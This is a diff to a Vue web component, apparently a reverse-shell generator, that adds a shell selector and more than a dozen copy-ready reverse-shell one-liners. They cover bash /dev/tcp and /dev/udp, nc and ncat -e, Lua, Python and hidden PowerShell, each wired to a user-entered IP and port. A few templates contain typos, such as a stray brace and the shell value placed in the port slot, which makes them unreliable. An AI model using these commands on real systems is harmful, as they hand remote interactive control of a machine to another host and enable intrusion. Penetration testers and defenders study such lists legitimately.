@@ -1,11 +1,11 @@
 <script setup>
-import {ref, reactive} from 'vue';
+import {reactive} from 'vue';
 
 // 适合复杂数组
 const web = reactive({
   ip: "8.8.8.8",
   port: "8080",
-  shell: "/bin/bash",
+  shell: "/bin/bash", // 默认值
   name: "不编码",
 })
 
@@ -25,17 +25,27 @@ function copy(id) {
     console.error('未找到元素:', id);
   }
 }
-
 </script>
 
 <template>
   <div class="main_shell">
-    <div class="tips input-section"> <!-- 添加 input-section 类以针对输入框优化 -->
+    <div class="tips input-section">
       <div class="input-row">
         <label class="label">shell种类:</label>
-        <input type="text" id="Source" v-model="web.Source" name="Source">
-        <label class="label">编码方式:</label>
-        <input type="text" id="name" v-model="web.name" name="name">
+        <select id="shell" v-model="web.shell" class="select-box">
+          <option value="/bin/sh">/bin/sh</option>
+          <option value="/bin/bash">/bin/bash</option>
+          <option value="sh">sh</option>
+          <option value="bash">bash</option>
+          <option value="ash">ash</option>
+          <option value="zsh">zsh</option>
+          <option value="dash">dash</option>
+<!--          <option value="cmd">cmd</option>-->
+<!--          <option value="powershell">powershell</option>-->
+        </select>
+
+        <!--        <label class="label">编码方式:</label>-->
+        <!--        <input type="text" id="name" v-model="web.name" name="name">-->
       </div>
 
       <div class="input-row">
@@ -51,48 +61,107 @@ function copy(id) {
       <div class="tips">
         <button @click="copy('cmd01')">Copy</button>
         [Linux] Bash -i:
-        <pre id="cmd01">{{web.shell}} -i >& /dev/tcp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
+        <pre id="cmd01">{{ web.shell }} -i >& /dev/tcp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
       </div>
 
       <div class="tips">
         <button @click="copy('cmd02')">Copy</button>
         [Linux] Bash 196 TCP:
-        <pre id="cmd02">0<&196;exec 196<>/dev/tcp/{{ web.ip }}/{{ web.port }}; {{web.shell}} <&196 >&196 2>&196</pre>
+        <pre id="cmd02">0<&196;exec 196<>/dev/tcp/{{ web.ip }}/{{ web.port }}; {{ web.shell }} <&196 >&196 2>&196</pre>
       </div>
 
       <div class="tips">
         <button @click="copy('cmd03')">Copy</button>
         [Linux] Bash 196 UDP:
-        <pre id="cmd03">0<&196;exec 196<>/dev/udp/{{ web.ip }}/{{ web.port }}; {{web.shell}} <&196 >&196 2>&196</pre>
+        <pre id="cmd03">0<&196;exec 196<>/dev/udp/{{ web.ip }}/{{ web.port }}; {{ web.shell }} <&196 >&196 2>&196</pre>
       </div>
 
       <div class="tips">
         <button @click="copy('cmd04')">Copy</button>
         [Linux] Bash read line:
-        <pre id="cmd04">exec 5<>/dev/tcp/{{ web.ip }}/{{ web.port }};cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
+        <pre id="cmd04">exec 5<>/dev/tcp/{{ web.ip }}/{{web.port}};cat <&5 | while read line; do $line 2>&5 >&5; done</pre>
       </div>
 
       <div class="tips">
         <button @click="copy('cmd05')">Copy</button>
         [Linux] Bash 5:
-        <pre id="cmd05">{{web.shell}} -i 5<> /dev/tcp/{{ web.ip }}/{{ web.port }} 0<&5 1>&5 2>&5</pre>
+        <pre id="cmd05">{{ web.shell }} -i 5<> /dev/tcp/{{ web.ip }}/{{ web.port }} 0<&5 1>&5 2>&5</pre>
       </div>
 
       <div class="tips">
-        <button @click="copy('cmd05')">Copy</button>
+        <button @click="copy('cmd06')">Copy</button>
         [Linux] Bash udp:
-        <pre id="cmd05">{{web.shell}} -i >& /dev/udp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
+        <pre id="cmd06">{{ web.shell }} -i >& /dev/udp/{{ web.ip }}/{{ web.port }} 0>&1</pre>
       </div>
+
+      <div class="tips">
+        <button @click="copy('cmd07')">Copy</button>
+        [Linux] nc -e:
+        <pre id="cmd07">nc {{ web.ip }} {{ web.port }} -e {{ web.shell }}</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd08')">Copy</button>
+        [Linux] ncat -e:
+        <pre id="cmd08">ncat {{ web.ip }} {{ web.port }} -e {{ web.shell }}</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd09')">Copy</button>
+        [Linux] Lua #1:
+        <pre id="cmd09">lua -e "require('socket');require('os');t=socket.tcp();t:connect('{{web.ip}}','{{web.port}}');os.execute('{{web.shell}} -i <&3 >&3 2>&3');"</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd10')">Copy</button>
+        [Linux] Python #1:
+        <pre id="cmd10">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{web.ip}}}",{{web.port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{{web.shell}}","-i"]);'</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd11')">Copy</button>
+        [Linux] Python #2:
+        <pre id="cmd11">export RHOST="{{web.ip}}";export RPORT={{web.port}};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{{web.shell}}")'</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd12')">Copy</button>
+        [Linux] Python #3:
+        <pre id="cmd12">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{web.ip}}",{{web.shell}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{{web.shell}}")'</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd13')">Copy</button>
+        [Windows] nc.exe -e:
+        <pre id="cmd13">nc.exe {{ web.ip }} {{ web.port }} -e cmd</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd14')">Copy</button>
+        [Windows] ncat.exe -e:
+        <pre id="cmd14">ncat.exe {{ web.ip }} {{ web.port }} -e cmd</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd15')">Copy</button>
+        [Windows] PowerShell #1:
+        <pre id="cmd15">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{{ web.ip }}",{{ web.port }});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+      </div>
+
+      <div class="tips">
+        <button @click="copy('cmd16')">Copy</button>
+        [Windows] PowerShell #2:
+        <pre
+            id="cmd16">powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{ web.ip }}}',{{ web.port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</pre>
+      </div>
+
 
     </div>
   </div>
   <br>
-
 </template>
 
-
 <style>
-
 button {
   padding: 0 5px;
   margin: 0;
@@ -140,12 +209,10 @@ pre {
   margin-bottom: 5px;
 }
 
-
 .tips {
   padding-bottom: 5px;
   padding-top: 5px;
   border-bottom: 1px dashed #999;
-
 }
 
 .tips ul {
@@ -180,6 +247,16 @@ input[type=text] {
   border: 1px solid #898989;
   font-size: 15px;
   width: 150px;
+  padding: 2px 5px;
+}
+
+/* 新增下拉框样式 */
+select.select-box {
+  border: 1px solid #898989;
+  font-size: 15px;
+  width: 150px;
+  padding: 2px 5px;
+  //height: 28px; /* 与输入框高度一致 */
 }
 
 /* 新增样式：输入框对齐 */
@@ -201,5 +278,10 @@ input[type=text] {
   margin-right: 5px; /* 标签与输入框间距 */
   background-color: #f6f8fa;
   border: 1px dotted #898989;
+  padding: 2px 5px;
+  //height: 28px; /* 与输入框高度一致 */
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
 }
 </style>
